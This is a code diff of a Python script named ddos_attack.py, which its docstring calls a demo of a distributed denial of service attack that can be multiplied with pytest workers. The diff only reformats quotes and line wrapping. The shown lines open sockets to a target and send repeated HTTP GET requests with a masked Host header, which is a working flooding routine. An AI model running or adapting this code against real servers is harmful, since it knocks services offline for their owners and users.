@@ -1,10 +1,10 @@
-'''
+"""
 ddos_attack.py
 
     - This script is used to demo a distributed denial of service attack
     - Pytest along with several other copies of this script can be used to achieve a larger load
     > pytest -n 10            # 10 being the number of scripts/workers
-'''
+"""
 
 import socket
 import threading
@@ -33,10 +33,10 @@ def ddos():
         # connect server
         serv.connect((target, port))
         # send request
-        serv.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"),
-                    (target, port))
-        serv.sendto(("Host: " + mask_ip + "\r\n\r\n").encode("ascii"),
-                    (target, port))
+        serv.sendto(
+            ("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port)
+        )
+        serv.sendto(("Host: " + mask_ip + "\r\n\r\n").encode("ascii"), (target, port))
         # close server
         serv.close()
         # use global
